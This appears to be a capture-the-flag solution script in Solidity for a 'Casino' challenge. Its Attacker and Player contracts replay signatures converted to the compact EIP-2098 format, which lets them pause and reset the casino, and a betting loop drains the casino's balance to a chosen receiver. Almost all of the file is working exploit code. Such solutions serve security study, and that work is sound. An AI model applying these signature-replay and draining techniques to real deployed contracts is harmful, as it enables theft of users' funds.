// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import "forge-ctf/CTFSolver.sol";
import "forge-std/console.sol";


import "src/Challenge.sol";
import "src/Casino.sol";


contract Player {
    Challenge public challenge;

    constructor(Challenge _challenge) {
        challenge = _challenge;
    }

    receive() external payable {
        challenge.PLAYER().call{value: msg.value}("");
    }   


    function betToWin() external {
        uint256 balance = challenge.CASINO().balances(address(this));
        uint256 casinoBalance = address(challenge.CASINO()).balance;
        uint256 betAmount = balance;
        if(~~~balance >= casinoBalance){
            uint256 delta = ~~~balance - casinoBalance;
            betAmount = balance > delta ? delta : balance;
        }
        require(challenge.CASINO().bet(betAmount), "Bet failed");
    }
    
}

contract Attacker {
    Player public player;
    Challenge public challenge;

    constructor(
        Challenge _challenge, 
        bytes memory _signature, 
        bytes32 _salt,
        bytes memory _signature2,
        address _receiver,
        bytes32 _salt2
    ) payable {
        challenge = _challenge;
        player = new Player(_challenge);
        challenge.CASINO().pause(_signature, _salt);
        challenge.CASINO().deposit{value: msg.value}(address(player));
        attack();
        challenge.CASINO().reset(_signature2, payable(_receiver), 1 ether, _salt2);
    }

    function attack() internal {

        while(true){

            address(player).call(abi.encodeWithSelector(Player.betToWin.selector));


            if(~~~challenge.CASINO().balances(address(player)) == address(challenge.CASINO()).balance){
                break;
            }
        }

    }

}




contract Solution is CTFSolver {

    error InvalidSignatureLength();
    error InvalidSignatureSValue();

    function slice(
        bytes memory _bytes,
        uint256 _start,
        uint256 _length
    )
        internal
        pure
        returns (bytes memory)
    {
        require(_length + 31 >= _length, "slice_overflow");
        require(_bytes.length >= _start + _length, "slice_outOfBounds");

        bytes memory tempBytes;

        assembly {
            switch iszero(_length)
            case 0 {
                // Get a location of some free memory and store it in tempBytes as
                // Solidity does for memory variables.
                tempBytes := mload(0x40)

                // The first word of the slice result is potentially a partial
                // word read from the original array. To read it, we calculate
                // the length of that partial word and start copying that many
                // bytes into the array. The first word we copy will start with
                // data we don't care about, but the last `lengthmod` bytes will
                // land at the beginning of the contents of the new array. When
                // we're done copying, we overwrite the full first word with
                // the actual length of the slice.
                let lengthmod := and(_length, 31)

                // The multiplication in the next line is necessary
                // because when slicing multiples of 32 bytes (lengthmod == 0)
                // the following copy loop was copying the origin's length
                // and then ending prematurely not copying everything it should.
                let mc := add(add(tempBytes, lengthmod), mul(0x20, iszero(lengthmod)))
                let end := add(mc, _length)

                for {
                    // The multiplication in the next line has the same exact purpose
                    // as the one above.
                    let cc := add(add(add(_bytes, lengthmod), mul(0x20, iszero(lengthmod))), _start)
                } lt(mc, end) {
                    mc := add(mc, 0x20)
                    cc := add(cc, 0x20)
                } {
                    mstore(mc, mload(cc))
                }

                mstore(tempBytes, _length)

                //update free-memory pointer
                //allocating the array padded to 32 bytes like the compiler does now
                mstore(0x40, and(add(mc, 31), not(31)))
            }
            //if we want a zero-length slice let's just return a zero-length array
            default {
                tempBytes := mload(0x40)
                //zero out the 32 bytes slice we are about to return
                //we need to do it because Solidity does not garbage collect
                mstore(tempBytes, 0)

                mstore(0x40, add(tempBytes, 0x20))
            }
        }

        return tempBytes;
    }


    function to2098Format(bytes memory signature) internal view returns (bytes memory) {
        if (signature.length != 65) revert InvalidSignatureLength();
        if (uint8(signature[32]) >> 7 == 1) revert InvalidSignatureSValue();
        bytes memory short = slice(signature, 0, 64);
        uint8 parityBit = uint8(short[32]) | ((uint8(signature[64]) % 27) << 7);
        short[32] = bytes1(parityBit);
        return short;
    }

    function calculateAmountNeeded(uint256 balance) internal pure returns (uint256){
        uint256 currentAmount = ~~~balance;
        while(currentAmount > 0.5 ether){
            currentAmount = currentAmount / 2;
        }
        return currentAmount;        
    }

    function solve(address _challenge, address _player) virtual internal override {
        Challenge challenge = Challenge(_challenge);
        Casino casino = challenge.CASINO();


        // console.log("Casino address", address(casino));
        bytes32 salt = 0x5365718353c0589dc12370fcad71d2e7eb4dcb557cfbea5abb41fb9d4a9ffd3a;
        bytes32 salt2 = 0x7867dc2b606f63c4ad88af7e48c7b934255163b45fb275880b4b451fa5d25e1b;

        bytes memory signature = to2098Format(vm.envBytes("SIGNATURE"));
        bytes memory signature2 = to2098Format(vm.envBytes("SIGNATURE_2"));
        address receiver = vm.envAddress("RECEIVER");

        Attacker attacker = new Attacker{value: 0.5 ether}(challenge, signature, salt, signature2, receiver, salt2);


        console.log("player balance", address(_player).balance);
        console.log("casino balance", address(casino).balance);
    }
}
